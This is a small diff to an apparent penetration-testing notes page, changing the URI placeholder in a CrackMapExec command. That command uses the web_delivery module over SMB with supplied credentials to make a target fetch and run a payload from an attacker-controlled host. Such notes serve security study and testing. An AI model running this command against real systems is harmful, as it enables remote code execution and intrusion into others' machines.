@@ -4,7 +4,7 @@
 
 - Refer to [[Web Delivery|Metasploit Web Delivery]] module.
 
-`$ crackmapexec smb <IP> -u <username> -p <password> -d <domain_name> -M web_delivery -o URL=http://<attacker_IP>/<URI>`
+`$ crackmapexec smb <IP> -u <username> -p <password> -d <domain_name> -M web_delivery -o URL=http://<attacker_IP>/[path/to/URI]`
 
 ---
 ## References
